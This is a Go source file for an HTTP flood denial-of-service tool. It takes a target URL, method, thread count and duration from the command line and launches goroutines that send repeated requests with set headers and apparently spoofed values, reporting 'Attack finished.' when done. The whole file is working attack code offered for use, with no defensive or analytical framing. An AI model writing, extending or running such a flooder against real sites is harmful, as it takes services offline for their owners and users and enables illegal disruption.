package main

import (
    "log"
    "os"
    "strconv"
    "sync"
    "time"

    "github.com/valyala/fasthttp"
)

var target struct {
    url     string
    threads int
    method  string
    a_type  string
    durasi  time.Duration
}

func httpflood(wg *sync.WaitGroup) {
    defer wg.Done()

    head := NewHeader(false, nil)
    sp := NewSpoof(5)
    client := &fasthttp.Client{}
    req := fasthttp.AcquireRequest()
    defer fasthttp.ReleaseRequest(req)

    req.SetRequestURI(target.url)
    req.Header.SetMethod(target.method)
    head.headers(req)
    sp.spoofS(req)

    deadline := time.After(target.durasi)

    for {
        select {
        case <-deadline:
            return
        default:
            client.Do(req, nil)
        }
    }
}

func main() {
    if len(os.Args) < 5 {
        log.Fatal("Usage: ./http <target> <GET/POST> <threads> <time_seconds>")
    }
    target.url = os.Args[1]
    target.method = os.Args[2]
    threads, _ := strconv.Atoi(os.Args[3])
    detik, _ := strconv.Atoi(os.Args[4])
    target.durasi = time.Duration(detik) * time.Second

    log.Printf("Started... %d threads for %ds", threads, detik)

    var wg sync.WaitGroup
    wg.Add(threads)
    for i := 0; i < threads; i++ {
        go httpflood(&wg)
    }
    wg.Wait()
    log.Println("Attack finished.")
}